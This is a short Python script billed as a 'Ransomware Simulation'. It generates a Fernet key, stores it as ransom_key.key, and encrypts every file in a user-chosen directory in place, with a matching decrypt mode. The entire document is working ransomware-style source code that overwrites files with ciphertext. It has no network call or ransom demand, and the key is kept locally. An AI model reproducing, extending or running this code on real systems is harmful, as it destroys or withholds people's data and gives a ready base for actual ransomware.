import os
import base64
from cryptography.fernet import Fernet

# Generate a key and save it
def generate_key():
    key = Fernet.generate_key()
    with open("ransom_key.key", "wb") as key_file:
        key_file.write(key)
    print("Encryption key generated and saved as 'ransom_key.key'")

# Load the encryption key
def load_key():
    return open("ransom_key.key", "rb").read()

# Encrypt all files in a directory
def encrypt_files(directory):
    key = load_key()
    cipher = Fernet(key)

    for file in os.listdir(directory):
        file_path = os.path.join(directory, file)
        
        if os.path.isfile(file_path) and file != "ransom_key.key":
            with open(file_path, "rb") as f:
                file_data = f.read()
            
            encrypted_data = cipher.encrypt(file_data)

            with open(file_path, "wb") as f:
                f.write(encrypted_data)
            print(f"🔒 Encrypted: {file}")

# Decrypt all files in a directory
def decrypt_files(directory):
    key = load_key()
    cipher = Fernet(key)

    for file in os.listdir(directory):
        file_path = os.path.join(directory, file)

        if os.path.isfile(file_path) and file != "ransom_key.key":
            with open(file_path, "rb") as f:
                encrypted_data = f.read()
            
            decrypted_data = cipher.decrypt(encrypted_data)

            with open(file_path, "wb") as f:
                f.write(decrypted_data)
            print(f"🔓 Decrypted: {file}")

# CLI Interface
if __name__ == "__main__":
    print("💀 Ransomware Simulation - Encrypt & Decrypt Files 💀")
    action = input("Type 'encrypt' to simulate attack or 'decrypt' to recover files: ").strip().lower()
    directory = input("Enter the directory to target: ").strip()

    if action == "encrypt":
        generate_key()
        encrypt_files(directory)
        print("\n🚨 All files encrypted! Keep your key safe to recover data.")

    elif action == "decrypt":
        decrypt_files(directory)
        print("\n✅ Files successfully recovered!")

    else:
        print("❌ Invalid input. Use 'encrypt' or 'decrypt'.")
